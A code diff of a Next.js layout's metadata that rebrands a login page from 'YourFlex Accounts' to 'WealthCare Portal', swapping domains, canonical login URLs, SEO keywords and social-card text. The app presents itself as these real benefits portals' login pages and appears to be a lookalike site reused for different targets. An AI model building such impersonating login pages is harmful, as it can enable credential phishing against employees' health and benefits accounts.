@@ -7,22 +7,21 @@ import "./globals.css";
 const geist = Geist({ subsets: ["latin"] });
 
 const CANONICAL_LOGIN_URL =
-  "https://yourflexaccounts.aptia365.com/Authentication/Handshake";
-const SITE_DOMAIN = "yourflexaccounts.aptia365.com";
-const SITE_BRAND = "YourFlex Accounts";
+  "https://osv.wealthcareportal.com/Authentication/Handshake";
+const SITE_DOMAIN = "osv.wealthcareportal.com";
+const SITE_BRAND = "WealthCare Portal";
 
 export const metadata: Metadata = {
   metadataBase: new URL(
     process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
   ),
   title: {
-    default: "YourFlex Accounts - Login",
-    template: "%s | YourFlex Accounts",
+    default: "WealthCare Portal - Login",
+    template: "%s | WealthCare Portal",
   },
   keywords: [
-    "YourFlex Accounts",
-    "Aptia 365",
-    "yourflexaccounts.aptia365.com",
+    "WealthCare Portal",
+    "osv.wealthcareportal.com",
     "benefits login",
     "employee benefits portal",
     "FSA login",
@@ -35,13 +34,14 @@ export const metadata: Metadata = {
     "secure login",
     "participant portal",
     "employer portal",
-    "handshake authentication"
+    "handshake authentication",
+    "WealthCare benefits"
   ],
-  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through WealthCare Portal.`,
 
-  authors: [{ name: "YourFlex Accounts" }],
-  creator: "YourFlex Accounts",
-  publisher: "YourFlex Accounts",
+  authors: [{ name: "WealthCare Portal" }],
+  creator: "WealthCare Portal",
+  publisher: "WealthCare Portal",
   applicationName: SITE_BRAND,
   referrer: "origin-when-cross-origin",
   robots: {
@@ -58,8 +58,8 @@ export const metadata: Metadata = {
   openGraph: {
     type: "website",
     locale: "en_US",
-    title: "YourFlex Accounts - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+    title: "WealthCare Portal - Login",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through WealthCare Portal.`,
     siteName: SITE_BRAND,
     url: CANONICAL_LOGIN_URL,
     images: [
@@ -73,8 +73,8 @@ export const metadata: Metadata = {
   },
   twitter: {
     card: "summary",
-    title: "YourFlex Accounts - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+    title: "WealthCare Portal - Login",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through WealthCare Portal.`,
     images: ["/favicon-32x32.png"],
   },
   icons: {
